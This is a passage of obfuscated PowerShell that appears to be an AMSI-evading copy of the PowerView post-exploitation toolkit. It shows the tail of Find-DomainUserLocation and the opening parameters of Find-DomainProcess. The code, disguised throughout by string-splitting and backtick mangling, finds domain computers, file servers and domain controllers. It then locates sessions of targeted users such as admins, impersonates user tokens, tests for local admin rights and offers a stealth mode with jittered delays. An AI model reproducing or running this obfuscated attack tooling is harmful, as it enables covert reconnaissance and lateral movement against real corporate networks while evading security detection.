        if (${PS`BoU`Nd`pAr`AmEters}[("{2}{0}{1}"-f'o','ne','Tombst')]) { ${C`OmPUTeRseA`RCH`eRArgu`MenTs}[("{2}{1}{0}" -f'ne','bsto','Tom')] = ${T`O`mBstONE} }
        if (${pSb`ouNDpa`RAmET`E`Rs}[("{0}{1}{3}{2}"-f'C','re','ential','d')]) { ${coMPuT`e`R`S`earChErAr`guM`enTs}[("{0}{2}{1}"-f'Crede','tial','n')] = ${CRed`e`NT`Ial} }

        ${U`serseA`R`cHeRa`RgUmEnts} = @{
            ("{2}{0}{1}"-f 'i','es','Propert') = ("{3}{1}{4}{0}{2}" -f 'nt','c','name','samac','ou')
        }
        if (${psB`OUndpa`R`AM`eTE`RS}[("{1}{2}{0}" -f 'ntity','UserId','e')]) { ${uSErS`E`ArcHer`ARGuME`N`TS}[("{2}{0}{1}"-f'denti','ty','I')] = ${userIdE`NT`ItY} }
        if (${PsBoU`Ndp`A`R`AmEters}[("{0}{1}" -f 'D','omain')]) { ${USe`RSEARc`hErA`RGUmE`N`TS}[("{0}{1}" -f 'Domai','n')] = ${DOM`AIN} }
        if (${Ps`Bou`NDpAr`A`me`TeRs}[("{3}{2}{0}{1}" -f'erD','omain','s','U')]) { ${u`SerSeArche`RA`RGume`NTS}[("{1}{0}" -f'ain','Dom')] = ${uSeRd`o`maIN} }
        if (${PSBouN`Dpa`RAME`TErS}[("{0}{3}{1}{2}"-f 'Use','LDAPFilte','r','r')]) { ${us`e`RSEARCh`ERarG`UmEN`Ts}[("{1}{2}{0}"-f 'ter','LD','APFil')] = ${U`Se`RLDaPfil`T`eR} }
        if (${pSBoU`N`DPa`RA`mEt`eRs}[("{0}{2}{1}" -f'UserSe','e','archBas')]) { ${us`eRsE`ARcHeRarGu`mEnTs}[("{2}{0}{1}"-f 'Ba','se','Search')] = ${U`SersEARc`Hb`A`SE} }
        if (${pSBoUNDpa`RaMEt`e`RS}[("{4}{0}{1}{3}{2}"-f'i','nC','t','oun','UserAdm')]) { ${USErs`Ea`Rc`HE`RaRguMe`Nts}[("{0}{2}{1}"-f'AdminC','nt','ou')] = ${us`ERadm`IncoUNt} }
        if (${pSbO`U`N`Dpa`RA`metERs}[("{0}{1}{3}{4}{2}" -f 'UserAl','l','ation','o','wDeleg')]) { ${uS`ERSEa`R`ch`era`RGUMe`NtS}[("{0}{1}{2}" -f 'Allo','wDelegatio','n')] = ${UsE`RA`l`LOwDelEGa`Ti`On} }
        if (${PsboUnD`p`AR`AMEt`ErS}[("{2}{0}{1}" -f 'er','ver','S')]) { ${u`SeRSEaRcH`erA`RG`UMenTS}[("{0}{1}" -f 'S','erver')] = ${sEr`Ver} }
        if (${PSbOun`D`PaR`AmE`TerS}[("{2}{0}{1}{3}" -f 'ea','r','S','chScope')]) { ${useR`S`EaRc`heR`ArGumE`NTs}[("{0}{1}{2}"-f'S','earchS','cope')] = ${SE`A`RCHs`CoPE} }
        if (${pSboUNDpAr`A`m`EtERs}[("{3}{4}{1}{2}{0}" -f'ze','tPa','geSi','Re','sul')]) { ${usE`R`SEarCHE`RA`Rg`UMeNtS}[("{0}{1}{2}"-f 'ResultPag','eSiz','e')] = ${R`ES`UlTp`A`gESIzE} }
        if (${pSboun`DPaR`A`MeTErs}[("{2}{3}{1}{0}{4}" -f 'imeLimi','verT','Se','r','t')]) { ${uSe`RSE`A`R`C`HeraRguME`NtS}[("{2}{4}{3}{1}{0}"-f 'mit','i','Server','meL','Ti')] = ${Ser`V`e`RT`ImeLImiT} }
        if (${PsB`O`U`NdPa`Rame`TErs}[("{1}{2}{0}"-f'one','To','mbst')]) { ${UsErs`EAr`C`HErA`RGu`MenTS}[("{2}{0}{1}"-f 'st','one','Tomb')] = ${TOM`B`StOnE} }
        if (${PSBou`N`dpara`Me`T`eRs}[("{2}{1}{0}" -f'tial','eden','Cr')]) { ${usErSE`AR`ch`E`R`ArguME`Nts}[("{2}{1}{0}"-f'tial','en','Cred')] = ${c`R`EdEN`Tial} }

        ${t`AR`g`ETcOMPuTeRS} = @()

        
        if (${PSb`OunDP`AR`AmETeRS}[("{1}{2}{0}{3}" -f'rN','Com','pute','ame')]) {
            ${T`ARg`etco`m`pUTers} = @(${c`oMP`UTe`RnAme})
        }
        else {
            if (${Ps`BOuN`dP`ARa`METERs}[("{1}{2}{0}" -f'th','Stea','l')]) {
                &("{0}{1}{2}{3}" -f 'Wr','ite-','Verbo','se') ('['+'Find-Do'+'main'+'UserLocat'+'io'+'n] '+'St'+'ealth'+' '+'enumera'+'ti'+'o'+'n '+'usi'+'ng '+'source'+': '+"$StealthSource")
                ${tARgE`TCOm`pUterArRA`yL`I`ST} = &("{1}{2}{0}"-f'ect','New','-Obj') ("{2}{1}{3}{7}{6}{0}{5}{8}{4}" -f 'on','te','Sys','m.C','st','s','lecti','ol','.ArrayLi')

                if (${s`TEalThs`OUr`ce} -match ((("{2}{0}{1}"-f'{','0}All','File')) -f [chAr]124)) {
                    &("{0}{1}{2}"-f'Wri','te-Verb','ose') ("{11}{2}{0}{4}{10}{9}{3}{12}{8}{1}{7}{14}{5}{13}{6}"-f 'ind-D',' ','F','serLoc','om','f','ervers','fo','tion] Querying','U','ain','[','a','ile s','r ')
                    ${FiLese`Rver`sE`ArCheRARgUm`EN`TS} = @{}
                    if (${psBO`UN`DP`ArAMEterS}[("{0}{1}{2}" -f'D','om','ain')]) { ${F`I`leS`ErvErsE`ArcH`E`RAr`gUMENtS}[("{1}{0}"-f'main','Do')] = ${d`Om`Ain} }
                    if (${psb`oUndpar`AM`eTerS}[("{1}{3}{0}{2}" -f 'om','Co','ain','mputerD')]) { ${f`ile`SeRverS`earCh`erar`Gum`EntS}[("{0}{1}" -f 'Do','main')] = ${CompuT`Erd`o`MA`IN} }
                    if (${psbOuN`DP`A`RAM`eTeRS}[("{2}{3}{0}{1}"-f 'erSea','rchBase','Comp','ut')]) { ${F`i`lesERv`ERSE`Ar`cHeRArguM`eNts}[("{1}{2}{0}"-f'archBase','S','e')] = ${Com`P`UTErs`eArc`HBase} }
                    if (${P`SBOUnd`p`Ara`mete`Rs}[("{1}{0}" -f'ver','Ser')]) { ${F`i`Le`Se`RVE`Rse`ARc`herARgUMeNTS}[("{1}{2}{0}" -f'er','Ser','v')] = ${s`e`RvEr} }
                    if (${psb`ou`NDpA`RaME`TERS}[("{2}{0}{3}{1}" -f 'c','cope','Sear','hS')]) { ${f`ILEsErveRseARC`h`ERAR`GumENTs}[("{1}{0}{2}" -f'ar','Se','chScope')] = ${SE`Ar`cHsco`pe} }
                    if (${Ps`BO`Un`DPArAmET`ers}[("{3}{0}{2}{1}"-f 'tPageS','e','iz','Resul')]) { ${fiLEseR`VERsE`ARche`RAR`gumen`TS}[("{1}{2}{0}" -f'geSize','Resu','ltPa')] = ${rES`UltPag`eSi`ZE} }
                    if (${pSBOUN`d`Pa`RamEtErS}[("{0}{1}{3}{2}{4}" -f 'S','e','TimeLi','rver','mit')]) { ${FIlEsEr`VEr`S`E`ARchE`RA`R`GuMents}[("{1}{2}{0}{3}"-f 'Limi','ServerT','ime','t')] = ${servErTi`mE`LImIt} }
                    if (${pSBoU`NDpARAmE`T`ERS}[("{0}{1}" -f 'Tombsto','ne')]) { ${f`ILe`s`eRvERs`eArchE`RaRGu`MeNTs}[("{2}{0}{1}" -f 'bston','e','Tom')] = ${t`ombs`ToNE} }
                    if (${PSbO`UNdpaRA`me`Te`Rs}[("{0}{1}{3}{2}" -f 'C','redent','l','ia')]) { ${fil`Ese`RvERsEArch`erArG`UmE`NTS}[("{3}{1}{2}{0}"-f 'ial','re','dent','C')] = ${crE`deNT`iAL} }
                    ${fIlE`S`ErvE`Rs} = &("{1}{5}{2}{0}{3}{4}"-f'ile','Get','mainF','S','erver','-Do') @FileServerSearcherArguments
                    if (${FILes`E`RVERS} -isnot [System.Array]) { ${F`iLEsEr`Ve`Rs} = @(${Fi`lesErvE`Rs}) }
                    ${tARgET`c`OMPUtE`Rar`RAY`LIST}.("{2}{1}{0}"-f 'ange','dR','Ad').Invoke( ${fi`lES`ERVe`RS} )
                }
                if (${sT`E`A`lthSO`URCE} -match ((("{3}{2}{0}{1}"-f'A','ll','{0}','DFS'))  -F [chAR]124)) {
                    &("{2}{3}{0}{4}{1}"-f'-','rbose','Wri','te','Ve') ("{2}{1}{6}{8}{5}{4}{3}{0}{7}" -f 'rying ','Fin','[','Que','ation] ','rLoc','d-D','for DFS servers','omainUse')
                    
                    
                }
                if (${ste`AlTH`soU`RCE} -match ((("{2}{1}{0}" -f'll','{0}A','DC')) -f [ChaR]124)) {
                    &("{0}{2}{3}{1}"-f'Write','ose','-Ver','b') ("{11}{1}{12}{2}{8}{4}{0}{13}{9}{5}{3}{15}{6}{14}{10}{7}" -f'] Quer','n','omainUserLoca','g fo','on','n','n','ers','ti','i','l','[Fi','d-D','y',' control','r domai')
                    ${DCseaRch`ErAr`GUMEn`TS} = @{
                        ("{1}{0}"-f 'P','LDA') = ${Tr`Ue}
                    }
                    if (${pSbOu`N`D`pAraMeTE`RS}[("{0}{1}"-f 'Dom','ain')]) { ${d`cs`EA`R`CHeraRG`UmEnts}[("{1}{0}"-f'n','Domai')] = ${d`OM`AIn} }
                    if (${PsB`ouN`dPA`RametERS}[("{1}{3}{2}{0}" -f'n','Com','rDomai','pute')]) { ${d`cs`eaRcHerarGUME`NtS}[("{0}{2}{1}" -f 'Doma','n','i')] = ${C`Om`Pu`TERd`OMain} }
                    if (${psbo`U`N`DPaRAMEt`eRS}[("{0}{1}"-f 'S','erver')]) { ${DC`S`EARC`HEraRgU`MeNTS}[("{0}{1}"-f 'Se','rver')] = ${s`ERv`Er} }
                    if (${p`SB`OUNDP`ARaMET`ERS}[("{2}{0}{1}"-f't','ial','Creden')]) { ${D`C`se`ArcheRA`RgUmEN`TS}[("{1}{2}{0}"-f 'ial','Crede','nt')] = ${Cr`e`deNTI`Al} }
                    ${D`OMA`INCo`NT`R`OllErS} = &("{1}{2}{0}{3}"-f'inControl','Get-D','oma','ler') @DCSearcherArguments | &("{1}{3}{0}{2}{4}"-f'ct-Ob','Se','je','le','ct') -ExpandProperty ("{0}{3}{1}{2}"-f'dn','stna','me','sho')
                    if (${DOmA`InConTrOl`LE`Rs} -isnot [System.Array]) { ${DOmAI`NcOn`T`Rollers} = @(${DOmAiNCo`NTroL`l`ers}) }
                    ${TargetcO`MPU`Terar`R`AY`LiSt}.("{2}{1}{0}"-f'e','ng','AddRa').Invoke( ${do`M`A`IncOntRO`ll`ERS} )
                }
                ${t`AR`GeTCom`PU`Ters} = ${tA`R`GETcOMpUTe`R`Arra`Yl`ISt}.("{1}{0}" -f'Array','To').Invoke()
            }
            else {
                &("{0}{3}{2}{1}" -f 'Writ','rbose','e','e-V') ("{3}{8}{9}{7}{0}{1}{4}{6}{5}{2}{10}" -f 'rLocat','ion','i','[F','] Quer',' all computers in the doma','ying for','Use','ind-D','omain','n')
                ${Ta`RGEtc`OmP`Ut`eRs} = &("{1}{3}{2}{0}{4}" -f'Co','Ge','n','t-Domai','mputer') @ComputerSearcherArguments | &("{0}{2}{1}{3}" -f'Sele','ec','ct-Obj','t') -ExpandProperty ("{1}{0}{2}{3}"-f 'nshostna','d','m','e')
            }
        }
        &("{0}{1}{2}{3}"-f 'W','ri','t','e-Verbose') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${ta`RGe`TCompu`T`Ers}."l`enGTH" -eq 0) {
            throw ("{11}{6}{4}{9}{8}{1}{5}{10}{12}{2}{13}{7}{3}{0}"-f 'rate','Locatio','und t','me','oma','n','nd-D','u','er','inUs','] No hosts ','[Fi','fo','o en')
        }

        
        if (${PsBoU`ND`P`ARAmeT`eRS}[("{1}{0}{2}" -f 'ia','Credent','l')]) {
            ${C`URrENTuS`Er} = ${CREd`E`Nt`Ial}.("{4}{5}{2}{3}{1}{0}" -f 'l','a','Cred','enti','Ge','tNetwork').Invoke()."u`SERNA`ME"
        }
        else {
            ${c`URRen`TuS`Er} = (  ( geT-VarIaBle 813fDT -vALueONLy)::"U`sern`AmE").("{0}{1}" -f 'ToLowe','r').Invoke()
        }

        
        if (${pSbouN`Dp`ArAm`etERs}[("{0}{1}{2}" -f 'Sho','wA','ll')]) {
            ${TaR`G`etuse`RS} = @()
        }
        elseif (${PS`BoUnd`PaRa`M`ETers}[("{3}{2}{1}{0}"-f'ty','i','t','UserIden')] -or ${pS`BoundpaR`A`mE`TErs}[("{1}{0}{2}{3}"-f 'se','U','rLDAPFilt','er')] -or ${p`SboUn`dP`AR`Am`EtErs}[("{1}{0}{2}"-f'serS','U','earchBase')] -or ${PSBO`UndPaR`A`meTeRS}[("{3}{0}{2}{1}" -f'rA','minCount','d','Use')] -or ${p`SBO`UndpaRaME`Ters}[("{0}{1}{2}{3}"-f 'Us','erAllowDelegat','i','on')]) {
            ${t`ArgEtUs`ers} = &("{2}{3}{0}{1}" -f'-D','omainUser','Ge','t') @UserSearcherArguments | &("{0}{3}{1}{2}"-f'Sele','jec','t','ct-Ob') -ExpandProperty ("{1}{3}{2}{0}"-f'e','s','untnam','amacco')
        }
        else {
            ${groU`PSe`ARCh`eRa`RgUm`En`TS} = @{
                ("{0}{1}"-f 'Identit','y') = ${U`S`ErgROu`piD`E`NTiTY}
                ("{0}{1}" -f'Recu','rse') = ${T`Rue}
            }
            if (${psBOUndP`ARa`m`E`TErS}[("{1}{2}{0}"-f 'in','Us','erDoma')]) { ${G`RO`UP`seArCheRARGUmE`NtS}[("{0}{1}{2}"-f'D','o','main')] = ${us`erdO`Main} }
            if (${p`S`Boundp`AR`AmE`Ters}[("{3}{2}{1}{0}" -f'e','hBas','rc','UserSea')]) { ${gr`ouPsear`cHEr`A`RgUme`NTs}[("{2}{1}{0}" -f 'ase','hB','Searc')] = ${U`S`ErS`EA`RchBaSe} }
            if (${P`sbo`UND`pA`RAMeTErS}[("{1}{0}"-f'er','Serv')]) { ${gRo`U`p`S`eARche`RaRg`UMeNTs}[("{0}{1}{2}"-f'Serv','e','r')] = ${sERv`er} }
            if (${P`SB`O`UNDParAM`E`TErs}[("{1}{2}{0}"-f'e','SearchSc','op')]) { ${GROuPsE`ARCH`E`R`ArGUmENTs}[("{1}{2}{0}" -f'e','Sea','rchScop')] = ${seAr`c`hSCOPE} }
            if (${psB`oU`NDp`AramEtERs}[("{1}{2}{3}{0}"-f'ze','Resul','tPage','Si')]) { ${gr`oUp`sEARC`HeRa`RGU`mENts}[("{2}{1}{3}{0}{4}" -f 'Si','esult','R','Page','ze')] = ${r`E`sULTPAGeS`ize} }
            if (${P`SBou`NDPA`R`AMEt`erS}[("{1}{2}{0}{3}"-f'mi','Serv','erTimeLi','t')]) { ${gR`oup`seArch`eRA`RguMENts}[("{4}{2}{1}{0}{3}"-f 'me','rTi','ve','Limit','Ser')] = ${S`E`RVeRt`I`MEL`IMiT} }
            if (${ps`BouNdpAR`AmeT`ERs}[("{1}{2}{0}" -f'bstone','T','om')]) { ${gROuP`sEAR`cHER`Ar`GU`ME`NTs}[("{1}{0}{2}"-f 'm','To','bstone')] = ${tO`M`Bs`ToNE} }
            if (${Ps`BO`U`NdPARaM`eters}[("{2}{0}{1}" -f 'rede','ntial','C')]) { ${GR`ouP`SeARchERa`R`GuME`N`Ts}[("{2}{0}{1}"-f 'i','al','Credent')] = ${C`Re`denTIaL} }
            ${TarGE`T`USErs} = &("{3}{1}{0}{2}"-f'nGr','Domai','oupMember','Get-') @GroupSearcherArguments | &("{0}{2}{1}" -f'S','ject','elect-Ob') -ExpandProperty ("{1}{2}{0}"-f 'e','MemberN','am')
        }

        &("{1}{0}{2}" -f'erbo','Write-V','se') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${sh`O`wALl}) -and (${tARgE`TuSe`RS}."leN`gtH" -eq 0)) {
            throw ("{7}{0}{5}{6}{8}{2}{3}{1}{4}"-f 'omainUse','s found to tar',' use','r','get','rLocatio','n','[Find-D','] No')
        }

        
        ${Ho`s`TENuM`B`loCk} = {
            Param(${cOMPut`ER`N`AmE}, ${T`Arge`T`USeRs}, ${Cu`R`RentU`sEr}, ${st`E`ALtH}, ${TO`KEn`HAN`dlE})

            if (${t`OKeN`HAn`DLe}) {
                
                ${Nu`LL} = &("{3}{2}{6}{5}{0}{4}{1}"-f 'son','tion','Use','Invoke-','a','er','rImp') -TokenHandle ${T`o`KEnHaNdle} -Quiet
            }

            ForEach (${tArgEtC`oMPUt`er} in ${com`p`UTeRnA`Me}) {
                ${up} = &("{0}{1}{3}{4}{2}" -f 'Te','st-Conne','on','ct','i') -Count 1 -Quiet -ComputerName ${t`ARG`etcOm`p`UTer}
                if (${u`p}) {
                    ${sE`Ss`I`OnS} = &("{0}{1}{3}{2}" -f'Get','-Ne','ion','tSess') -ComputerName ${tAR`geTCo`mpU`T`ER}
                    ForEach (${Se`sSIoN} in ${S`E`SSiONS}) {
                        ${UseRNa`mE} = ${ses`sIoN}."Us`E`RNaME"
                        ${c`NaME} = ${se`Ssi`on}."cnA`ME"

                        if (${c`N`Ame} -and ${Cn`AmE}.("{2}{0}{1}" -f 'rtsW','ith','Sta').Invoke('\\')) {
                            ${c`NaMe} = ${c`NAMe}.("{2}{1}{0}" -f'art','t','TrimS').Invoke('\')
                        }

                        
                        if ((${us`ERn`AMe}) -and (${u`s`eRN`Ame}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') -and (${uS`eRN`AME} -notmatch ${c`Ur`REn`TuSEr}) -and (${uSE`R`NAme} -notmatch '\$$')) {

                            if ( (-not ${TA`RgETU`s`ERs}) -or (${Ta`RGeT`U`SERs} -contains ${U`SeR`N`AME})) {
                                ${U`S`e`RlOC`AtIOn} = &("{0}{1}{2}"-f'New-O','bje','ct') ("{1}{0}"-f't','PSObjec')
                                ${uS`ERLOca`T`ion} | &("{1}{0}{2}" -f 'dd-Membe','A','r') ("{2}{0}{1}"-f'pr','operty','Note') ("{2}{1}{0}{3}"-f 'oma','serD','U','in') ${N`ULL}
                                ${userL`oc`ATI`On} | &("{1}{0}{2}"-f 'Membe','Add-','r') ("{3}{0}{1}{2}" -f 'otepro','p','erty','N') ("{0}{1}{2}"-f'Us','erNam','e') ${uSerN`AME}
                                ${U`Se`RLocAT`ION} | &("{1}{2}{0}"-f'ber','Add-M','em') ("{1}{3}{2}{0}" -f'y','Note','ropert','p') ("{0}{1}{2}"-f'C','o','mputerName') ${T`AR`getCoMp`UT`eR}
                                ${us`er`LOCaTion} | &("{3}{1}{2}{0}" -f'er','d-','Memb','Ad') ("{0}{2}{1}"-f'Notep','rty','rope') ("{1}{0}{2}{3}"-f 'ess','S','ionF','rom') ${CN`AME}

                                
                                try {
                                    ${cn`AmeDn`snaMe} =  (gEt-iTem  ("varIab"+"LE:ixTR"+"O")  ).vaLue::("{0}{3}{1}{2}" -f'GetHos','r','y','tEnt').Invoke(${CN`A`mE}) | &("{1}{2}{0}" -f 'ject','Sel','ect-Ob') -ExpandProperty ("{0}{1}{2}"-f'HostNa','m','e')
                                    ${U`s`Er`lOCaTi`oN} | &("{2}{1}{0}"-f'ber','dd-Mem','A') ("{0}{1}{2}{3}" -f'NoteP','rop','e','rty') ("{3}{4}{1}{0}{2}"-f 'F','n','romName','Se','ssio') ${c`NamE`dnsn`Ame}
                                }
                                catch {
                                    ${u`sEr`LoC`ATION} | &("{1}{0}{2}" -f'emb','Add-M','er') ("{0}{2}{3}{1}"-f'N','roperty','ote','P') ("{0}{3}{1}{2}"-f 'Ses','ion','FromName','s') ${NU`lL}
                                }

                                
                                if (${c`HE`CK`ACCeSS}) {
                                    ${A`DmIn} = (&("{0}{2}{3}{1}"-f'Test-A','cess','dm','inAc') -ComputerName ${c`NaME})."IsA`Dm`IN"
                                    ${uS`eR`lo`CaTIon} | &("{0}{3}{2}{1}"-f 'A','ber','Mem','dd-') ("{1}{0}{2}"-f'otep','N','roperty') ("{0}{1}{3}{2}" -f'L','ocal','in','Adm') ${AdM`In}."I`sad`mIn"
                                }
                                else {
                                    ${USERlOca`T`I`on} | &("{0}{2}{1}"-f'A','-Member','dd') ("{1}{0}{2}" -f 'o','N','teproperty') ("{1}{0}{2}"-f'alAd','Loc','min') ${N`ULL}
                                }
                                ${u`sErlOC`AT`IOn}."psoBJ`Ect"."t`yPena`M`ES".("{1}{0}{2}"-f'ser','In','t').Invoke(0, ("{3}{0}{2}{1}{4}"-f'werView.Use','ocat','rL','Po','ion'))
                                ${UserlOC`A`T`ion}
                            }
                        }
                    }
                    if (-not ${s`T`ealTH}) {
                        
                        ${L`ogg`e`doN} = &("{1}{2}{0}" -f 'on','Get-Net','Logged') -ComputerName ${T`ARGEtcom`pU`TER}
                        ForEach (${u`ser} in ${L`O`Gg`edoN}) {
                            ${U`seR`N`Ame} = ${Us`er}."u`SEr`NAME"
                            ${uSeRdo`M`AiN} = ${u`SeR}."lo`gOnD`o`Main"

                            
                            if ((${uSer`N`AMe}) -and (${u`sERNA`ME}.("{1}{0}" -f 'm','tri').Invoke() -ne '')) {
                                if ( (-not ${tar`gEt`USE`Rs}) -or (${Ta`R`GeT`UsErs} -contains ${uSE`Rn`AMe}) -and (${uSE`Rna`Me} -notmatch '\$$')) {
                                    ${I`P`AdD`Ress} = @(&("{1}{0}{2}{4}{3}" -f'lv','Reso','e-IPAd','ress','d') -ComputerName ${TAR`GE`TCOmp`U`TER})[0]."IP`ADdrE`SS"
                                    ${Us`eRLoca`TI`on} = &("{2}{3}{0}{1}"-f 'Objec','t','N','ew-') ("{0}{1}" -f 'P','SObject')
                                    ${U`se`RloCa`TIoN} | &("{2}{1}{0}" -f 'r','Membe','Add-') ("{0}{2}{1}"-f'Notepr','rty','ope') ("{2}{1}{0}" -f 'n','mai','UserDo') ${Us`eR`domAIN}
                                    ${UsER`l`oCA`Ti`On} | &("{2}{0}{1}"-f '-Mem','ber','Add') ("{2}{1}{0}" -f'roperty','otep','N') ("{0}{2}{1}"-f'U','rName','se') ${u`Se`R`NAMe}
                                    ${USE`Rl`O`CATIoN} | &("{1}{0}{2}" -f 'Membe','Add-','r') ("{1}{0}{2}" -f'pr','Note','operty') ("{2}{1}{3}{0}"-f 'Name','omput','C','er') ${T`ArGeTCOMpu`Ter}
                                    ${USe`RL`ocAt`iOn} | &("{2}{0}{1}" -f'Mem','ber','Add-') ("{2}{0}{1}"-f 'pro','perty','Note') ("{1}{0}"-f'ress','IPAdd') ${I`p`ADdrESs}
                                    ${U`sErlocAT`Ion} | &("{2}{0}{1}"-f 'emb','er','Add-M') ("{1}{0}{2}"-f'tep','No','roperty') ("{2}{0}{1}" -f 'ssio','nFrom','Se') ${nU`LL}
                                    ${USE`RL`oCaTiOn} | &("{1}{2}{0}" -f'ember','A','dd-M') ("{2}{0}{1}"-f 'roper','ty','Notep') ("{1}{0}{2}{3}" -f 'ssio','Se','nFromNa','me') ${N`UlL}

                                    
                                    if (${CH`ECKA`CCess}) {
                                        ${Ad`M`In} = &("{3}{0}{1}{4}{2}"-f'dminAc','c','ss','Test-A','e') -ComputerName ${TARGE`T`C`OM`PUTEr}
                                        ${uSe`RLoC`AtIOn} | &("{0}{1}{2}" -f 'A','dd-Me','mber') ("{3}{0}{2}{1}"-f'op','rty','e','Notepr') ("{1}{2}{0}"-f 'in','LocalA','dm') ${aDm`iN}."is`ADm`In"
                                    }
                                    else {
                                        ${uSeRlOC`A`T`IOn} | &("{0}{1}{3}{2}"-f'Ad','d','mber','-Me') ("{2}{3}{1}{0}" -f'rty','rope','Note','p') ("{2}{0}{1}" -f 'ocalAdmi','n','L') ${Nu`lL}
                                    }
                                    ${u`SerlOc`AtION}."P`S`oBJeCt"."T`Y`p`eNaMES".("{0}{2}{1}" -f 'In','t','ser').Invoke(0, ("{0}{1}{4}{3}{2}{6}{5}" -f 'PowerV','iew.U','oc','erL','s','tion','a'))
                                    ${USeRL`o`CaTION}
                                }
                            }
                        }
                    }
                }
            }

            if (${t`o`kENhAN`DLe}) {
                &("{2}{3}{0}{1}" -f'Rever','tToSelf','Invo','ke-')
            }
        }

        ${logO`N`T`okEn} = ${n`ULl}
        if (${pSBO`Un`DPa`RA`metERS}[("{3}{0}{2}{1}"-f'n','al','ti','Crede')]) {
            if (${P`SBOu`NdpaR`AmE`TerS}[("{0}{1}" -f 'Dela','y')] -or ${PSbo`U`N`DPA`R`AMeteRs}[("{3}{2}{0}{1}"-f 'Succ','ess','On','Stop')]) {
                ${L`o`GOntOkEN} = &("{0}{6}{4}{2}{3}{5}{1}"-f'I','on','UserImp','er','e-','sonati','nvok') -Credential ${credeNT`I`AL}
            }
            else {
                ${lo`GONT`Ok`en} = &("{4}{1}{0}{2}{3}{6}{5}"-f 'U','ke-','serImp','e','Invo','sonation','r') -Credential ${creD`eNT`IAl} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${Ps`B`OU`NDpArA`MeTers}[("{1}{0}"-f 'ay','Del')] -or ${p`s`BO`UNdPa`RAMetE`RS}[("{0}{2}{3}{1}" -f'Sto','ess','pOn','Succ')]) {

            &("{1}{2}{0}" -f '-Verbose','Writ','e') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{3}{2}{0}{1}" -f 's','e','erbo','Write-V') ('[Fi'+'nd-'+'DomainUse'+'rLo'+'cation] '+'De'+'l'+'ay: '+"$Delay, "+'Ji'+'tte'+'r: '+"$Jitter")
            ${C`O`UntEr} = 0
            ${RA`NdNO} = &("{0}{1}{2}"-f'New-Ob','jec','t') ("{0}{1}{2}" -f'System','.R','andom')

            ForEach (${t`Ar`geTc`oM`PutER} in ${tARgETC`oM`pu`TErs}) {
                ${C`ounteR} = ${co`U`NtER} + 1

                
                &("{0}{2}{1}"-f 'Sta','t-Sleep','r') -Seconds ${Ran`Dno}.("{1}{0}"-f 'ext','N').Invoke((1-${ji`TTEr})*${DE`L`AY}, (1+${J`i`TtER})*${D`eLaY})

                &("{2}{0}{1}"-f 'ite-V','erbose','Wr') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{2}{3}{1}{0}" -f'd','n','Inv','oke-Comma') -ScriptBlock ${hOs`TENU`Mbl`o`cK} -ArgumentList ${t`ARg`ETCoMPuTER}, ${t`A`RgETu`SErs}, ${cURR`enTU`SER}, ${STE`A`LtH}, ${loG`oNT`Ok`En}

                if (${resu`lT} -and ${s`To`POnS`UCcess}) {
                    &("{3}{1}{0}{2}"-f'-Ve','ite','rbose','Wr') ("{7}{3}{5}{11}{6}{10}{0}{4}{8}{9}{2}{1}"-f'u','rly','turning ea','i','nd, ','nd-Dom','get use','[F','r','e','r fo','ainUserLocation] Tar')
                    return
                }
            }
        }
        else {
            &("{1}{2}{0}{3}" -f'os','Wri','te-Verb','e') ('[Find-DomainUs'+'e'+'rLoca'+'tion]'+' '+'Usin'+'g'+' '+'thr'+'ea'+'ding '+'w'+'ith '+'t'+'hread'+'s: '+"$Threads")
            &("{1}{0}{2}"-f 'erb','Write-V','ose') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${sc`Ri`PtP`ARams} = @{
                ("{1}{2}{0}" -f's','Target','User') = ${ta`RG`ETus`Ers}
                ("{3}{1}{2}{0}"-f'ser','re','ntU','Cur') = ${c`U`Rr`eNtusEr}
                ("{1}{0}"-f 'th','Steal') = ${STEA`l`Th}
                ("{0}{1}{2}" -f 'To','kenHa','ndle') = ${log`ON`To`ken}
            }

            
            &("{3}{2}{0}{1}" -f 'edFunctio','n','Thread','New-') -ComputerName ${tARG`ET`coMPu`TerS} -ScriptBlock ${H`Os`T`eNU`MBlOCK} -ScriptParameters ${S`crI`P`TpARa`ms} -Threads ${T`h`REadS}
        }
    }

    END {
        if (${Lo`goN`TOKen}) {
            &("{5}{2}{4}{1}{3}{0}"-f 'tToSelf','-R','o','ever','ke','Inv') -TokenHandle ${lo`go`NTo`KEN}
        }
    }
}


function fInd`-Dom`AInp`R`OCEsS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'ouldPr','PSSh','oce','ss'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}{5}{4}"-f'l','SCrede','PSUseP','ntia','ype','T'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{2}{6}{5}{0}{7}"-f's','gPl','ainTex','idUsin','PSAvo','rPas','tFo','word'}, '')]
    [OutputType({"{3}{4}{2}{1}{0}" -f'ocess','UserPr','iew.','Pow','erV'})]
    [CmdletBinding(DEfAultParAMEterSETName = {"{1}{0}"-f'e','Non'})]
    Param(
        [Parameter(pOSiTIon = 0, ValUEfrOMPIPELiNE = ${T`RUE}, VaLUefrOMpIPelInebyPROPERTYNaME = ${tr`Ue})]
        [Alias({"{2}{1}{0}" -f 'tName','Hos','DNS'})]
        [String[]]
        ${coMPut`eRNA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMPut`e`RdOMa`In},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`m`PuTERL`dApfILTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMPuTeRS`eArc`hBa`se},

        [Alias({"{3}{0}{1}{2}{4}" -f'o','nstrai','n','Unc','ed'})]
        [Switch]
        ${comPUt`e`R`UNConstr`AInEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{2}{3}" -f'Ope','ting','Syst','em','ra'})]
        [String]
        ${c`OM`P`UTe`ROPErATin`gSYs`T`eM},

        [ValidateNotNullOrEmpty()]
